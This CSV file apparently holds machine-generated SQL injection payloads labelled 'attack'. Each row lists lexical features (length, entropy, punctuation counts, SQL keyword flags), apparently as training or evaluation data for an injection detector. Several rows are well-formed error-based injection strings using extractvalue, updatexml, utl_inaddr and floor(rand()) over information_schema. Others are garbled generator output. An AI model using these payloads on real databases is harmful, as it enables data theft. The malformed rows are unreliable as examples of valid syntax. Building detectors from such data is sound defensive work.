label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'owwev'  =  'elgz""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""i",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,0,613.0,43.0,3.9324675768915696,201.0,79.0,241.0,92.0,0.3278955954323002,0.12887438825448613,0.3931484502446982,0.1500815660685155,4.0,2.0,0.0,0.0,2.0,4.0,0.0,48.0,0.0,5.0,5.0,26.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,0.0,3.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,-6236tn   )'  =  ')   or by extractvalueselect 9067 4493=,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,1,57.0,26.0,4.182752182393339,24.0,12.0,14.0,7.0,0.42105263157894735,0.21052631578947367,0.24561403508771928,0.12280701754385964,2.0,0.0,1.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""ljzxgwhereuntloj'  =  'u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,2,26.0,18.0,4.0081320258334,17.0,1.0,4.0,4.0,0.6538461538461539,0.038461538461538464,0.15384615384615385,0.15384615384615385,2.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'dqn)' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'jz'  =  'o",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,3,512.0,41.0,3.875792788520855,137.0,91.0,201.0,83.0,0.267578125,0.177734375,0.392578125,0.162109375,6.0,0.0,0.0,0.0,0.0,5.0,0.0,40.0,0.0,3.0,6.0,27.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'w"" like ""'  =  'zt",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,4,502.0,44.0,4.022331392738036,158.0,97.0,186.0,61.0,0.3147410358565737,0.19322709163346613,0.3705179282868526,0.12151394422310757,4.0,4.0,0.0,0.0,2.0,4.0,0.0,33.0,0.0,0.0,11.0,9.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,3.0,1.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,18.0
attack,1   a)    )    ))    )u''  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,5,31.0,7.0,1.8227398351601525,2.0,1.0,19.0,9.0,0.06451612903225806,0.03225806451612903,0.6129032258064516,0.2903225806451613,3.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '   )    )    )    ' like 'cyy where 7469  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,6,367.0,40.0,3.8295745100887864,114.0,59.0,152.0,42.0,0.3106267029972752,0.16076294277929154,0.4141689373297003,0.11444141689373297,4.0,0.0,0.0,0.0,2.0,2.0,0.0,27.0,0.0,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,1  )   or 2131 by  soejoxdmge,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,7,29.0,16.0,3.4773223738410977,14.0,5.0,9.0,1.0,0.4827586206896552,0.1724137931034483,0.3103448275862069,0.034482758620689655,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'yo' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||''  =  'dul'  =  'zqodrx",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,8,532.0,39.0,3.898662562359934,149.0,91.0,207.0,85.0,0.2800751879699248,0.17105263157894737,0.3890977443609023,0.15977443609022557,8.0,0.0,0.0,0.0,0.0,6.0,0.0,39.0,0.0,3.0,6.0,28.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'az'  =  'j.g' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||''  =  '"" like ""dq'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V5__sql_aware__len20__gpre60__reward_on__seed88,9,422.0,43.0,3.701818786722726,105.0,74.0,180.0,63.0,0.24881516587677724,0.17535545023696683,0.4265402843601896,0.14928909952606634,10.0,2.0,0.0,0.0,1.0,6.0,0.0,31.0,0.0,0.0,9.0,9.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,2.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
